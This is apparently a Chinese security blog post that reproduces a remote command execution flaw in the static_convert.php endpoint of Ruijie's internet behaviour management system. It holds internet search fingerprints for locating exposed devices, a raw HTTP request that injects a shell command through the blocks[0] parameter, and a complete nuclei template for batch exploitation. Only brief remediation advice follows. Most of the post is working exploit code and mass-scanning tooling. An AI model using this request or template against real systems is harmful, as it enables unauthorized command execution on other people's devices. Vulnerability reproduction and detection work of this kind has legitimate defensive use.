#  【漏洞复现 | 含批量POC】锐捷上网行为管理系统 static_convert.php 远程命令执行漏洞   
小明同学  小明信安   2024-06-22 14:46  
  
**0x01 免责声明**  
  
disclaimer  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。信息及工具收集于互联网，真实性及安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
**0x02 漏洞介绍**  
  
Vulnerability introduction  
  
    锐捷上网行为管理系统/view/IPV6/naborTable/static_convert.php接口存在任意命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。  
  
**0x03 搜索语法**  
  
Search for syntax  
  
- Fofa：  
  
  
```
body="c33367701511b4f6020ec61ded352059"
```  
  
- Hunter  
  
  
```
body="c33367701511b4f6020ec61ded352059"
```  
  
- Quake  
  
  
```
body="c33367701511b4f6020ec61ded352059"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSJmmtO9BBB9QTkA3DurUX9u7FhT7ocfJsyr4Fe1f2BsL5vVicy5768icyttukS3D5aJOWxoS8eoUdNw/640?wx_fmt=png&from=appmsg "")  
  
**0x04 漏洞复现**  
  
Request packets  
  
- 请求接口执行任意命令，例如写入文件  
  
```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'abab'%20>>%20/var/www/html/test.txt%0A HTTP/1.1
Host:your-ip
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSJmmtO9BBB9QTkA3DurUX9ufXtZFzq2geIpJTe2JCTZuHoyezicC2j8TlIiaESWHeXDiaLvuJWSJfheQ/640?wx_fmt=png&from=appmsg "")  
- 访问路径/test.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSJmmtO9BBB9QTkA3DurUX9uk8bNZsLqVuXdIdMGjZ7TlMuKD86hbUjToBWoTcUmehkKHI3sbmJlTA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**0x05 nuclei POC**  
  
nuclei POC  
  
- Nuclei 批量检测POC  
  
- 所用方法nuclei.exe -l 网址文件.txt -t POC.yaml  
  
```
id: Ruijie_RG-UAC_static_convert_RCE

info:
  name: Ruijie_RG-UAC_static_convert_RCE
  author: security-xm
  severity: high
  description: 锐捷上网行为管理系统static_convert.php存在远程命令执行漏洞
  metadata:
    max-request: 2
    shodan-query: ""
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'abab'%20>>%20/var/www/html/test.txt%0A HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

  - |+
    @timeout: 30s
    GET /test.txt HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - abab
      condition: and

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSJmmtO9BBB9QTkA3DurUX9umiaUwwc7yxC68HFmQ18D4DGUcxicUq8Ij6MHibiawBbmE4jp3z1flqQ3rg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x07 修复建议**  
  
Remediation recommendations  
  
- 在Web应用防火墙中添加接口临时黑名单规则  
  
- 联系厂商打补丁或升级版本。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/WfB6o4vicwSISMoBvibVByMUlExr9ibqmnwWAbwiaNjO1XPzIHNbfEIfgfSHeJqDSHqIw8pXKSdgic1vSia8HhntX5lw/640?wx_fmt=gif&from=appmsg "")  
  
  
